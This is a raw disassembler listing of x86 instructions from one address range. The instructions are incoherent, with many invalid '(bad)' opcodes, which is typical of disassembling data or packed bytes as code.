  41a519:	sbb    eax,0x14c90217
  41a51e:	dec    esi
  41a51f:	xchg   ecx,eax
  41a520:	dec    eax
  41a521:	retf   0xcb99
  41a524:	cwde   
  41a525:	pop    eax
  41a526:	cld    
  41a527:	mov    ds:0xa1cbf7ae,al
  41a52c:	xchg   esp,eax
  41a52d:	mov    ds:0x48a899dd,al
  41a532:	sub    ecx,DWORD PTR [esi+0x62f8f996]
  41a538:	mov    ebx,0x8df9eb9b
  41a53d:	cld    
  41a53e:	imul   edx,DWORD PTR [eax+0x69],0x9b6829e0
  41a545:	pop    ss
  41a546:	inc    eax
  41a547:	jo     0x41a546
  41a549:	mov    BYTE PTR [ebx+0x59],ah
  41a54c:	ror    DWORD PTR [eax],1
  41a54e:	push   edx
  41a54f:	pop    ds
  41a550:	inc    ecx
  41a551:	adc    eax,0x51d8bb29
  41a556:	loop   0x41a599
  41a558:	fld1   
  41a55a:	mov    cl,ch
  41a55c:	in     al,0x18
  41a55e:	jnp    0x41a5d5
  41a560:	add    DWORD PTR [ecx],edx
  41a562:	sub    al,0x3e
  41a564:	daa    
  41a565:	mov    bh,0x1a
  41a567:	pusha  
  41a568:	mov    esp,0x5c79714a
  41a56d:	adc    eax,0x2feffa7c
  41a572:	stos   BYTE PTR es:[edi],al
  41a573:	jp     0x41a55e
  41a575:	or     al,0x8b
  41a577:	repnz std 
  41a579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a57a:	push   ebx
  41a57b:	xchg   esi,eax
  41a57c:	and    eax,0x9de499cc
  41a581:	xor    bh,bl
  41a583:	push   esi
  41a584:	dec    ebx
  41a585:	(bad)  
  41a586:	cmp    eax,0xfdad57e
  41a58b:	inc    ebp
  41a58c:	push   ebp
  41a58d:	dec    ebx
  41a58e:	outs   dx,DWORD PTR ds:[esi]
  41a58f:	sbb    eax,0x803a9427
  41a594:	rcl    BYTE PTR [edi+ebp*2-0x2e],0xd5
  41a599:	test   eax,0x7b295377
  41a59e:	fmulp  st(4),st
  41a5a0:	add    al,0x37
  41a5a2:	sub    DWORD PTR ss:[edx+edx*4],esi
  41a5a6:	push   es
  41a5a7:	repnz xchg eax,esp
  41a5aa:	jne    0x41a5af
  41a5ac:	test   DWORD PTR [eax-0x3a],edx
  41a5af:	fsub   st,st(5)
  41a5b1:	or     al,0xb8
  41a5b3:	xchg   edi,eax
  41a5b4:	hlt    
  41a5b5:	xchg   ecx,eax
  41a5b6:	imul   edi,DWORD PTR [esi-0x14],0x36
  41a5ba:	mov    edi,0xa638d7ae
  41a5bf:	adc    ah,al
  41a5c1:	sub    DWORD PTR [edx],edx
  41a5c3:	sub    BYTE PTR [ebx+0x4b],dl
  41a5c6:	loopne 0x41a5cc
  41a5c8:	pop    edi
  41a5c9:	mov    esp,0xe16e9981
  41a5ce:	pop    esi
  41a5cf:	sub    dl,BYTE PTR [esi]
  41a5d1:	sub    ah,0x40
  41a5d4:	and    al,0xc2
  41a5d6:	fmul   st,st(0)
  41a5d8:	int    0x80
  41a5da:	xor    eax,0xc918d6fc
  41a5df:	xchg   edi,eax
  41a5e0:	retf   0xdb38
  41a5e3:	xchg   edi,eax
  41a5e4:	jmp    0x904398b
  41a5e9:	xor    al,0xdb
  41a5eb:	test   BYTE PTR [ebx+0x51],bl
  41a5ee:	fs fwait
  41a5f0:	and    al,0x92
  41a5f2:	pop    esi
  41a5f3:	jno    0x41a655
  41a5f5:	jmp    0x79bc:0x944966f9
  41a5fc:	adc    ecx,DWORD PTR [eax-0x34]
  41a5ff:	add    BYTE PTR [eax-0x3871090e],ch
  41a605:	xchg   BYTE PTR [esi-0x7e],bh
  41a608:	pop    ecx
  41a609:	outs   dx,DWORD PTR ds:[esi]
  41a60a:	call   0xd047:0xeaf01a2
  41a611:	xchg   ebx,eax
  41a612:	mov    eax,0x413d0970
  41a617:	adc    al,0x6e
  41a619:	xchg   edx,eax
  41a61a:	pop    edx
  41a61b:	adc    dl,BYTE PTR [ecx+ebx*1-0x1981fb69]
  41a622:	cmc    
  41a623:	(bad)  
  41a624:	rcr    BYTE PTR [ebx],cl
  41a626:	add    eax,DWORD PTR [esp+ecx*2]
  41a629:	fiadd  DWORD PTR [ebx+0x1a]
  41a62c:	sbb    eax,0xc342341d
  41a631:	xor    BYTE PTR [edi],ah
  41a633:	(bad)  
  41a634:	jmp    0xf13a:0x35958a2b
  41a63b:	pop    ss
  41a63c:	sbb    dh,cl
  41a63e:	outs   dx,BYTE PTR ds:[esi]
  41a63f:	jmp    0x2eb9e2e7
  41a644:	bound  edi,QWORD PTR ds:0x415d685e
  41a64a:	mov    ss,WORD PTR [ebx+0x7d]
  41a64d:	sbb    eax,0x254d98cd
  41a652:	fidiv  WORD PTR [ebp+esi*8+0x585fbc4c]
  41a659:	repnz inc edi
  41a65b:	ret    
  41a65c:	or     eax,0x61c831a0
  41a661:	mov    bh,0xc7
  41a663:	lock (bad) 
  41a666:	push   eax
  41a667:	imul   edi,DWORD PTR [ebx-0x79],0xffffff8d
  41a66b:	ins    DWORD PTR es:[edi],dx
  41a66c:	arpl   WORD PTR [edx+0x3a10e96],ax
  41a672:	jl     0x41a61c
  41a674:	not    esp
  41a676:	in     eax,dx
  41a677:	mov    al,0x67
  41a679:	jmp    0x7b5c:0x6b805d68
  41a680:	ins    BYTE PTR es:[edi],dx
  41a681:	cmp    al,0xe7
  41a683:	mov    dl,0x48
  41a685:	imul   esp,esp,0x6e
  41a688:	mov    DWORD PTR [eax],0xde66cff5
  41a68e:	xchg   esp,eax
  41a68f:	ror    DWORD PTR [esi+edi*8-0x66],cl
  41a693:	mov    esp,0x586f195
  41a698:	shr    ah,cl
  41a69a:	jl     0x41a6b8
  41a69c:	adc    al,0x48
  41a69e:	cmp    edx,DWORD PTR [edi-0x40a0fb97]
  41a6a4:	sub    dh,BYTE PTR ds:0x8c1638e9
  41a6aa:	les    ebx,FWORD PTR [edi]
  41a6ac:	push   0x62
  41a6ae:	jmp    0xcd0:0xb1707b71
  41a6b5:	dec    ebp
  41a6b6:	jmp    0xad46:0x13522394
  41a6bd:	push   0xffffff80
  41a6bf:	sub    eax,esp
  41a6c1:	adc    BYTE PTR [edx],ah
  41a6c3:	jp     0x41a672
  41a6c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6c6:	xchg   edi,eax
  41a6c7:	push   esi
  41a6c8:	xchg   ebp,edx
  41a6ca:	pop    ecx
  41a6cb:	lea    edx,[esi+eiz*8]
  41a6ce:	mov    DWORD PTR [edx-0x5b],0x342627fc
  41a6d5:	call   0xb4243d10
  41a6da:	scas   eax,DWORD PTR es:[edi]
  41a6db:	pop    edx
  41a6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6dd:	or     edx,ebx
  41a6df:	daa    
  41a6e0:	push   ebx
  41a6e1:	jecxz  0x41a6a2
  41a6e3:	into   
  41a6e4:	adc    al,0x44
  41a6e6:	sar    BYTE PTR [edi+edi*4-0x16],0x46
  41a6eb:	das    
  41a6ec:	call   0x95f9:0xa0a625b2
  41a6f3:	sub    ch,BYTE PTR [ecx+0x28]
  41a6f6:	fsubr  DWORD PTR [eax-0x26]
  41a6f9:	lahf   
  41a6fa:	dec    ecx
  41a6fb:	xor    eax,0x809a38f1
  41a700:	jecxz  0x41a735
  41a702:	add    ecx,DWORD PTR [eax]
  41a704:	outs   dx,BYTE PTR ss:[esi]
  41a706:	lods   eax,DWORD PTR ds:[esi]
  41a707:	into   
  41a708:	sbb    bl,bh
  41a70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a70b:	jmp    0x41a746
  41a70d:	cmp    al,0x46
  41a70f:	inc    ecx
  41a710:	add    al,0xf1
  41a712:	(bad)  
  41a713:	stos   BYTE PTR es:[edi],al
  41a714:	mov    ecx,0x41742feb
  41a719:	es loopne 0x41a6e2
  41a71c:	les    eax,FWORD PTR gs:[ebp+0x39e24c61]
  41a723:	push   es
  41a724:	mov    edi,esi
  41a726:	cmp    ebx,DWORD PTR [ebx+0xaef0718]
  41a72c:	retf   0xfe3
  41a72f:	dec    ebx
  41a730:	sbb    dl,BYTE PTR ds:0x25088345
  41a736:	or     eax,0xdb037514
  41a73b:	pop    edx
  41a73c:	fst    QWORD PTR [edi-0x27]
  41a73f:	lock xchg BYTE PTR [ebx+0x2f4596d4],bh
  41a746:	dec    edx
  41a747:	mov    cl,0xee
  41a749:	cwde   
  41a74a:	ja     0x41a766
  41a74c:	pushf  
  41a74d:	(bad)  
  41a74e:	shr    DWORD PTR [edx-0x6ca0bcc],cl
  41a754:	cmp    DWORD PTR [ebp+0x23],0x29
  41a758:	es or  eax,0x42b91d6c
  41a75e:	outs   dx,DWORD PTR ds:[esi]
  41a75f:	sahf   
  41a760:	xchg   ebx,eax
  41a761:	jecxz  0x41a7c7
  41a763:	rcr    DWORD PTR [eax+0x58],cl
  41a766:	push   edi
  41a767:	loopne 0x41a6f2
  41a769:	xlat   BYTE PTR ds:[ebx]
  41a76a:	pusha  
  41a76b:	inc    edx
  41a76c:	sub    eax,0xbc3d96c6
  41a771:	pop    ecx
  41a772:	(bad)  
  41a773:	daa    
  41a774:	sti    
  41a775:	or     eax,0x6c35960
  41a77a:	ins    DWORD PTR es:[edi],dx
  41a77b:	or     al,0x8b
  41a77d:	mov    ebx,0x66914b27
  41a782:	and    DWORD PTR [ecx+ebp*4-0x59],0xbd8624a9
  41a78a:	add    ch,BYTE PTR [eax]
  41a78c:	pop    ebx
  41a78d:	jb     0x41a727
  41a78f:	push   eax
  41a790:	jbe    0x41a77b
  41a792:	mov    ds:0x142dfe42,eax
  41a797:	stos   DWORD PTR es:[edi],eax
  41a798:	jmp    0x41a756
  41a79a:	or     al,0x1d
  41a79c:	call   0x648f:0x60b440fa
  41a7a3:	add    BYTE PTR [ecx-0x78dd9c65],bl
  41a7a9:	out    0xbb,eax
  41a7ab:	or     al,0xb1
  41a7ad:	int    0x9f
  41a7af:	dec    edi
  41a7b0:	js     0x41a7cc
  41a7b2:	int3   
  41a7b3:	es push esp
  41a7b5:	fsubr  st,st(1)
  41a7b7:	jg     0x41a77e
  41a7b9:	and    al,0xaf
  41a7bb:	(bad)  
  41a7bc:	out    0x1d,eax
  41a7be:	in     eax,dx
  41a7bf:	std    
  41a7c0:	mov    WORD PTR [esi+0x8],cs
  41a7c3:	mov    ch,0x21
  41a7c5:	push   esp
  41a7c6:	xchg   edi,eax
  41a7c7:	dec    ebx
  41a7c8:	mov    edx,0x8dd14ae0
  41a7cd:	in     eax,dx
  41a7ce:	nop
  41a7cf:	sub    cl,BYTE PTR [bx+di]
  41a7d2:	shr    BYTE PTR [eax-0x22761209],1
  41a7d8:	sar    DWORD PTR [ebp+ecx*4+0x51],1
  41a7dc:	pop    ds
  41a7dd:	mov    al,ds:0xed97861b
  41a7e2:	aad    0x2f
  41a7e4:	xchg   BYTE PTR [eax+0x7d37fc82],bl
  41a7ea:	ds cmp BYTE PTR es:[edi],bh
  41a7ee:	stos   BYTE PTR es:[edi],al
  41a7ef:	pop    esp
  41a7f0:	mov    esi,0x7c343e29
  41a7f5:	pop    edx
  41a7f6:	mov    edx,0xbcbd4c89
  41a7fb:	mov    esp,es
  41a7fd:	pop    ds
  41a7fe:	repz add BYTE PTR [edx-0x80],ah
  41a802:	jmp    0x9178:0x8ac8958c
  41a809:	xchg   ecx,eax
  41a80a:	adc    eax,0xd2749f86
  41a80f:	mov    edi,0x3ca0ca83
  41a814:	jmp    0xad90b8b1
  41a819:	bnd ret 0x5a07
  41a81d:	mov    dh,0x31
  41a81f:	ins    DWORD PTR es:[edi],dx
  41a820:	shr    DWORD PTR [ecx-0x29],1
  41a823:	in     al,0xe5
  41a825:	jns    0x41a804
  41a827:	sbb    eax,DWORD PTR ds:0x28a86687
  41a82d:	jno    0x41a7c4
  41a82f:	aas    
  41a830:	test   al,0x5e
  41a832:	sbb    bl,bl
  41a834:	push   esi
  41a835:	fcmovne st,st(6)
  41a837:	add    esp,eax
  41a839:	call   0xcfc70f9c
  41a83e:	pushf  
  41a83f:	dec    ebp
  41a840:	call   0xa3b5:0xf66be344
  41a847:	push   DWORD PTR [ebp+0x14130c68]
  41a84d:	xchg   ebp,eax
  41a84e:	cmp    ebp,DWORD PTR [edi]
  41a850:	lahf   
  41a851:	xchg   edi,eax
  41a852:	cdq    
  41a853:	adc    eax,0x6c01a5e6
  41a858:	xor    al,0x6b
  41a85a:	xchg   ebx,eax
  41a85b:	xchg   edx,eax
  41a85c:	push   esi
  41a85d:	jno    0x41a831
  41a85f:	das    
  41a860:	loop   0x41a814
  41a862:	clc    
  41a863:	or     DWORD PTR [esi+0x26],ebp
  41a866:	push   ecx
  41a867:	jae    0x41a8a3
  41a869:	jo     0x41a83f
  41a86b:	cmp    DWORD PTR [esp+edx*2-0x7a],ebx
  41a86f:	jns    0x41a8a8
  41a871:	cmp    DWORD PTR [ecx+0x59],ebx
  41a874:	imul   DWORD PTR [ecx+0x24]
  41a877:	neg    DWORD PTR [eax]
  41a879:	sbb    al,0xa0
  41a87b:	mov    ah,BYTE PTR [edx]
  41a87d:	inc    edx
  41a87e:	xchg   esi,eax
  41a87f:	mov    ebx,DWORD PTR [ecx-0x34577f81]
  41a885:	pusha  
  41a886:	mov    esi,0xaa2dd600
  41a88b:	jge    0x41a89c
  41a88d:	push   cs
  41a88e:	mov    cl,0x4d
  41a890:	out    dx,al
  41a891:	mov    esi,0x2fdc5732
  41a896:	push   es
  41a897:	jno    0x41a8c0
  41a899:	lock dec ebx
  41a89b:	jecxz  0x41a89f
  41a89d:	sbb    edi,DWORD PTR [ebx+0x2f]
  41a8a0:	clc    
  41a8a1:	dec    eax
  41a8a2:	inc    ebp
  41a8a3:	xchg   esp,eax
  41a8a4:	aas    
  41a8a5:	fidiv  WORD PTR [eax+esi*2-0x7ebb1e42]
  41a8ac:	mov    fs,WORD PTR [eax-0x5b85fb0e]
  41a8b2:	out    0xc4,eax
  41a8b4:	stc    
  41a8b5:	inc    edx
  41a8b6:	cdq    
  41a8b7:	les    esi,FWORD PTR [eax+0x73]
  41a8ba:	xchg   esi,esp
  41a8bc:	inc    eax
  41a8bd:	hlt    
  41a8be:	mov    WORD PTR [edx+ecx*2+0x476ed2fe],?
  41a8c5:	adc    eax,0x47e51d11
  41a8ca:	adc    BYTE PTR [ebx+0x3bc6b2eb],ah
  41a8d0:	jmp    0x2a8012b4
  41a8d5:	or     al,0x21
  41a8d7:	pop    edi
  41a8d8:	jnp    0x41a8ee
  41a8da:	rol    DWORD PTR [ecx],0xe5
  41a8dd:	jno    0x41a871
  41a8df:	xor    eax,0x40c0591f
  41a8e4:	jae    0x41a8f2
  41a8e6:	push   0x4
  41a8e8:	push   0x5c27f13f
  41a8ed:	ret    
  41a8ee:	cmp    ebp,0xa849cca4
  41a8f4:	xlat   BYTE PTR ds:[ebx]
  41a8f5:	jge    0x41a92a
  41a8f7:	mov    ebx,0xe8bb7740
  41a8fc:	std    
  41a8fd:	mov    ebp,0x707e9542
  41a902:	mov    edi,0x8f24386d
  41a907:	int    0xb8
  41a909:	and    eax,0xda7aa58b
  41a90e:	sar    DWORD PTR [ebp+0x6941b6c6],1
  41a914:	(bad)  
  41a916:	dec    eax
  41a917:	inc    ebx
  41a918:	push   eax
  41a919:	das    
  41a91a:	push   es
  41a91b:	in     al,0xc9
  41a91d:	pusha  
  41a91e:	scas   eax,DWORD PTR es:[edi]
  41a91f:	rol    DWORD PTR [ebp-0x25],cl
  41a922:	test   DWORD PTR [esi+ebp*2],ebx
  41a925:	aam    0x6b
  41a927:	arpl   WORD PTR [edi-0x2cdc99ce],di
  41a92d:	bound  edi,QWORD PTR ds:0x29c4cc0
  41a933:	call   0x14f269a8
  41a938:	cmc    
  41a939:	bound  ecx,QWORD PTR [edx]
  41a93b:	cs mov edx,0x8dbafe28
  41a941:	fcom   QWORD PTR [eax+ebp*1+0x19]
  41a945:	aas    
  41a946:	mov    ebx,0xd8d99589
  41a94b:	cmp    ch,BYTE PTR [edi+eiz*8+0x239edb43]
  41a952:	rcl    DWORD PTR [edi-0x52],cl
  41a955:	or     BYTE PTR [eax-0x192d9b7c],0x83
  41a95c:	les    ebp,FWORD PTR [ebp-0x2f]
  41a95f:	loope  0x41a962
  41a961:	mov    ds,WORD PTR [edx]
  41a963:	stos   BYTE PTR es:[edi],al
  41a964:	xchg   edx,eax
  41a965:	mov    ds:0xcbef0dde,al
  41a96a:	cmp    DWORD PTR [edi+0x58b834b8],edi
  41a970:	cmp    BYTE PTR [edx],cl
  41a972:	out    dx,al
  41a973:	xor    BYTE PTR [ebp-0x56d6a84e],al
  41a979:	imul   edx,DWORD PTR [esi-0x569b5a25],0xffffffae
  41a980:	jl     0x41a948
  41a982:	ret    
  41a983:	sbb    al,0xcc
  41a985:	scas   eax,DWORD PTR es:[edi]
  41a986:	loop   0x41a9d9
  41a988:	push   0x13
  41a98a:	xchg   edx,eax
  41a98b:	pusha  
  41a98c:	sbb    al,0x88
  41a98e:	sbb    eax,0xd4282a40
  41a993:	fdivr  st(1),st
  41a995:	leave  
  41a996:	nop
  41a997:	sbb    cl,ah
  41a999:	inc    ebx
  41a99a:	push   0x1e
  41a99c:	or     eax,DWORD PTR [edx+0x5bc502a9]
  41a9a2:	xor    al,0x5c
  41a9a4:	cli    
  41a9a5:	nop
  41a9a6:	ja     0x41a9ce
  41a9a8:	nop
  41a9a9:	xor    eax,0xa83ea6e7
  41a9ae:	dec    edi
  41a9af:	mov    esp,ebx
  41a9b1:	aam    0xee
  41a9b3:	jae    0x41a935
  41a9b5:	pop    ss
  41a9b6:	jno    0x41a941
  41a9b8:	mov    ah,0xeb
  41a9ba:	shr    BYTE PTR [ebx-0x24],1
  41a9bd:	fbstp  TBYTE PTR [eax+edx*2+0x50]
  41a9c1:	pushf  
  41a9c2:	shl    BYTE PTR [ecx+0x3f],1
  41a9c5:	dec    ebp
  41a9c6:	mov    cl,BYTE PTR [edx-0x40]
  41a9c9:	pop    es
  41a9ca:	adc    BYTE PTR [ebx+0x1697481b],0xd2
  41a9d1:	jmp    0x6b7f087
  41a9d6:	jmp    0x665f:0x82b94c04
  41a9dd:	cmp    al,0xcf
  41a9df:	xor    eax,0xade0fa5c
  41a9e4:	std    
  41a9e5:	jae    0x41a97f
  41a9e7:	loope  0x41a9f1
  41a9e9:	call   0x958eefec
  41a9ee:	call   0x108bc68
  41a9f3:	add    BYTE PTR [edx+0xe],ah
  41a9f6:	sub    BYTE PTR [esi+ecx*2-0x4774e92b],bh
  41a9fd:	jo     0x41aa6a
  41a9ff:	bound  esi,QWORD PTR [ebx+ebx*1]
  41aa02:	stos   DWORD PTR es:[edi],eax
  41aa03:	xchg   esp,eax
  41aa04:	in     eax,0x27
  41aa06:	dec    ebx
  41aa07:	push   ebx
  41aa08:	lock (bad) 
  41aa0a:	out    dx,eax
  41aa0b:	mov    bh,0xc0
  41aa0d:	aaa    
  41aa0e:	dec    ecx
  41aa0f:	shl    DWORD PTR [eax+0xbbf91c8],1
  41aa15:	in     al,dx
  41aa16:	mov    al,0xd8
  41aa18:	sbb    eax,0xae3d0e37
  41aa1d:	xor    DWORD PTR [ebx],ecx
  41aa1f:	pop    edx
  41aa20:	(bad)  
  41aa21:	aad    0x33
  41aa23:	outs   dx,DWORD PTR ds:[esi]
  41aa24:	dec    edi
  41aa25:	and    DWORD PTR [ebx],esi
  41aa27:	jae    0x41aa95
  41aa29:	hlt    
  41aa2a:	cmc    
  41aa2b:	loope  0x41a9b2
  41aa2d:	adc    edx,DWORD PTR [ebp+0x67611b22]
  41aa33:	cwde   
  41aa34:	popf   
  41aa35:	pop    ebp
  41aa36:	jl     0x41aa8d
  41aa38:	pop    ebp
  41aa39:	retf   
  41aa3a:	pushf  
  41aa3b:	pop    esp
  41aa3c:	std    
  41aa3d:	jle    0x41a9f2
  41aa3f:	and    eax,0x1f87027d
  41aa44:	and    al,0x5a
  41aa46:	hlt    
  41aa47:	in     al,dx
  41aa48:	ins    BYTE PTR es:[edi],dx
  41aa49:	out    dx,al
  41aa4a:	fisubr WORD PTR [ebx]
  41aa4c:	mov    esi,0x3a2cc86d
  41aa51:	xchg   dh,ch
  41aa53:	and    DWORD PTR [esi-0x15],esp
  41aa56:	repz push ecx
  41aa58:	inc    esi
  41aa59:	lods   eax,DWORD PTR ds:[esi]
  41aa5a:	imul   esi,ebx,0xd
  41aa5d:	lss    edx,FWORD PTR [ebp-0x3c564577]
  41aa64:	es dec ebp
  41aa66:	xchg   esi,eax
  41aa67:	(bad)  
  41aa68:	adc    bh,BYTE PTR ds:0xbdcba5b9
  41aa6e:	push   ss
  41aa6f:	jl     0x41aa9f
  41aa71:	xchg   ebx,eax
  41aa72:	mul    BYTE PTR gs:[esi]
  41aa75:	(bad)  [eax]
  41aa77:	xor    ebx,esi
  41aa79:	aas    
  41aa7a:	inc    edi
  41aa7b:	int    0x4e
  41aa7d:	cmp    bl,dl
  41aa7f:	rcl    DWORD PTR [esi-0x575adaaf],cl
  41aa85:	push   ebp
  41aa86:	aaa    
  41aa87:	lods   eax,DWORD PTR ds:[esi]
  41aa88:	mov    eax,ss:0xd8dfe35a
  41aa8e:	mov    WORD PTR [esp+eiz*2],gs
  41aa91:	mov    edx,0xfc354822
  41aa96:	shr    DWORD PTR [esi+0x4a],0xd9
  41aa9a:	push   cs
  41aa9b:	jle    0x41aa32
  41aa9d:	ss jno 0x41aa62
  41aaa0:	out    0xc3,al
  41aaa2:	sbb    al,0x9a
  41aaa4:	fstp   DWORD PTR [esp+ecx*4-0x6b]
  41aaa8:	lea    esp,[esi-0x214c6ea5]
  41aaae:	daa    
  41aaaf:	bound  esp,QWORD PTR [ebp-0x4d983c92]
  41aab5:	sar    DWORD PTR [ecx-0x11c8dd75],0x31
  41aabc:	mov    ebp,0x81fe603a
  41aac1:	add    DWORD PTR [ebp-0x41bc842c],esp
  41aac7:	jmp    0xd522a6d7
  41aacc:	sbb    cx,bx
  41aacf:	adc    dl,bl
  41aad1:	sub    ah,dl
  41aad3:	lock (bad) 
  41aad5:	jecxz  0x41aa57
  41aad7:	jge    0x41aa6c
  41aad9:	std    
  41aada:	arpl   WORD PTR [ebx+0x3f],cx
  41aadd:	mov    eax,ds:0xd75ca2bd
  41aae2:	mov    ebp,0xbc487bcb
  41aae7:	scas   eax,DWORD PTR es:[edi]
  41aae8:	pop    edi
  41aae9:	push   esp
  41aaea:	fnsave [edx-0x6e]
  41aaed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaee:	lods   eax,DWORD PTR ds:[esi]
  41aaef:	xchg   ebx,eax
  41aaf0:	and    DWORD PTR [eax+0x58],ecx
  41aaf3:	je     0x41ab3c
  41aaf5:	sar    BYTE PTR [ecx],cl
  41aaf7:	test   DWORD PTR [esi-0x39],0xf47f9c18
  41aafe:	loope  0x41ab17
  41ab00:	fmul   st,st(4)
  41ab02:	inc    esp
  41ab03:	fidiv  WORD PTR [ecx+0x3eea6c7d]
  41ab09:	xor    dh,BYTE PTR [eax-0x20]
  41ab0c:	xor    BYTE PTR [edi+ebp*2-0x62cf0d9e],dh
  41ab13:	and    DWORD PTR [ecx-0x17e9f034],edi
  41ab19:	sbb    ah,BYTE PTR [ebx]
  41ab1b:	hlt    
  41ab1c:	sbb    ebp,esp
  41ab1e:	xor    ch,al
  41ab20:	jecxz  0x41aad2
  41ab22:	scas   eax,DWORD PTR es:[edi]
  41ab23:	imul   esi,DWORD PTR cs:[eax],0x966391ee
  41ab2a:	and    BYTE PTR [ebp-0x88a4e70],dl
  41ab30:	sbb    al,0x7a
  41ab32:	cld    
  41ab33:	xchg   BYTE PTR [edi+0x19],al
  41ab36:	pop    ecx
  41ab37:	cmc    
  41ab38:	sbb    eax,0x5031b480
  41ab3d:	sbb    al,BYTE PTR [edx-0x2b]
  41ab40:	pop    es
  41ab41:	into   
  41ab42:	in     eax,dx
  41ab43:	pop    esi
  41ab44:	push   ss
  41ab45:	arpl   WORD PTR [ebx],cx
  41ab47:	fidiv  WORD PTR [edx+0x4]
  41ab4a:	imul   esp,DWORD PTR [ebx],0xffffffb3
  41ab4d:	mov    al,ds:0xb4d5b981
  41ab52:	rol    DWORD PTR [ebx+0x6e],0xc8
  41ab56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab57:	fsub   DWORD PTR [esi+0x3e45ae04]
  41ab5d:	aaa    
  41ab5e:	ss mov ebp,0x503a5d87
  41ab64:	push   edx
  41ab65:	ss cmc 
  41ab67:	imul   ebx,DWORD PTR [edi+0x5],0xb559e1d7
  41ab6e:	test   BYTE PTR [ebx-0x39],0x76
  41ab72:	xchg   edi,eax
  41ab73:	hlt    
  41ab74:	mov    ds,WORD PTR [ebx]
  41ab76:	sbb    al,0x32
  41ab78:	scas   al,BYTE PTR es:[edi]
  41ab79:	test   DWORD PTR [esi],eax
  41ab7b:	ds inc eax
  41ab7d:	jle    0x41ab34
  41ab7f:	or     edx,DWORD PTR [edi]
  41ab81:	inc    ebx
  41ab82:	bound  eax,QWORD PTR [ebx-0x31]
  41ab85:	jmp    0xc7eac3e6
  41ab8a:	and    eax,0x6453a579
  41ab8f:	push   edi
  41ab90:	enter  0x2e1,0xd4
  41ab94:	in     eax,0xd9
  41ab96:	mov    ?,WORD PTR [esi]
  41ab98:	bnd jmp 0x41aba7
  41ab9b:	mov    WORD PTR [edx+0x28],cs
  41ab9e:	fild   QWORD PTR gs:[esi]
  41aba1:	scas   al,BYTE PTR es:[edi]
  41aba2:	out    0xab,al
  41aba4:	and    BYTE PTR [eax+0x38a6f73f],cl
  41abaa:	adc    DWORD PTR [ebp-0x661eb470],esi
  41abb0:	in     eax,0x8d
  41abb2:	and    al,0x86
  41abb4:	nop
  41abb5:	mov    ds:0x80170544,al
  41abba:	fidivr DWORD PTR [edi+eiz*4-0x3e]
  41abbe:	dec    eax
  41abbf:	into   
  41abc0:	push   0x3c867090
  41abc5:	jno    0x41abec
  41abc7:	sbb    DWORD PTR [ebx+0x7d],edi
  41abca:	jns    0x41ab89
  41abcc:	jge    0x41ab8a
  41abce:	frstor [edi+eax*1]
  41abd1:	mov    dh,0x50
  41abd3:	inc    edx
  41abd4:	cmp    eax,0x22a59045
  41abd9:	jmp    0x94b4cb11
  41abde:	fadd   QWORD PTR [edi+0x38359e01]
  41abe4:	add    bh,BYTE PTR [ebx-0x23c35106]
  41abea:	stos   BYTE PTR es:[edi],al
  41abeb:	jp     0x41ac0d
  41abed:	clc    
  41abee:	sbb    dl,BYTE PTR [edx+0x666d7d65]
  41abf4:	adc    edx,0xffffffd9
  41abf7:	push   eax
  41abf8:	ins    DWORD PTR es:[edi],dx
  41abf9:	jnp    0x41abd6
  41abfb:	imul   edx,ecx,0xf3f0ee8b
  41ac01:	(bad)  [edi+0x57]
  41ac04:	scas   eax,DWORD PTR es:[edi]
  41ac05:	lods   al,BYTE PTR ds:[esi]
  41ac06:	cmp    eax,0x7273f9e2
  41ac0b:	pop    edi
  41ac0c:	pop    eax
  41ac0d:	mov    al,0xd0
  41ac0f:	stos   DWORD PTR es:[edi],eax
  41ac10:	inc    edi
  41ac11:	call   0x7df52294
  41ac16:	sbb    eax,0x8c3d2e11
  41ac1b:	stos   BYTE PTR es:[edi],al
  41ac1c:	inc    esp
  41ac1d:	push   esp
  41ac1e:	dec    ecx
  41ac1f:	rcr    ah,cl
  41ac21:	or     ah,ch
  41ac23:	push   ds
  41ac24:	xor    esp,DWORD PTR [ecx+0x78]
  41ac27:	pop    edx
  41ac28:	fst    QWORD PTR [ecx-0x78]
  41ac2b:	rol    ebx,1
  41ac2d:	mov    bl,0x8c
  41ac2f:	sahf   
  41ac30:	sbb    BYTE PTR [ecx],ah
  41ac32:	mov    esi,0x9f6deab7
  41ac37:	bound  ecx,QWORD PTR [edi-0x29b4073e]
  41ac3d:	mov    DWORD PTR [eax-0x4ad37e9],edi
  41ac43:	in     al,dx
  41ac44:	cmc    
  41ac45:	push   edi
  41ac46:	ins    BYTE PTR es:[edi],dx
  41ac47:	xchg   edx,eax
  41ac48:	ja     0x41ac49
  41ac4a:	mul    ch
  41ac4c:	(bad)  
  41ac4d:	lock mov ah,0x91
  41ac50:	dec    ecx
  41ac51:	ror    DWORD PTR [ebx],1
  41ac53:	(bad)  
  41ac54:	cld    
  41ac55:	retf   0x9030
  41ac58:	in     al,dx
  41ac59:	clc    
  41ac5a:	jle    0x41accf
  41ac5c:	repnz mov al,ds:0x68c93c8e
  41ac62:	and    BYTE PTR [edi+0x691f0a9b],0x9c
  41ac69:	jb     0x41ac71
  41ac6b:	push   edx
  41ac6c:	dec    esp
  41ac6d:	mov    eax,ds:0x43ee5efd
  41ac72:	(bad)  
  41ac73:	mov    ah,0x87
  41ac75:	and    eax,0xd1dd9b04
  41ac7a:	lods   eax,DWORD PTR ds:[esi]
  41ac7b:	repnz std 
  41ac7d:	lods   al,BYTE PTR ds:[esi]
  41ac7e:	dec    edi
  41ac7f:	lods   eax,DWORD PTR ds:[esi]
  41ac80:	test   al,0x53
  41ac82:	mov    ecx,0xb1106b26
  41ac87:	nop
  41ac88:	sub    DWORD PTR [edi-0x3b],esi
  41ac8b:	sbb    BYTE PTR [ebp+0x35],ah
  41ac8e:	cmp    eax,0x2a5279ec
  41ac93:	les    esi,FWORD PTR [edi+0x1b2bebd2]
  41ac99:	lea    edi,[esi-0x761fdbc3]
  41ac9f:	aaa    
  41aca0:	xor    al,0x5e
  41aca2:	xchg   DWORD PTR [ebx],esp
  41aca4:	retf   0x9b95
  41aca7:	loope  0x41acce
  41aca9:	mov    ebp,0xd4283415
  41acae:	ds jmp 0x50f949af
  41acb4:	xor    BYTE PTR [eax-0x1d],bh
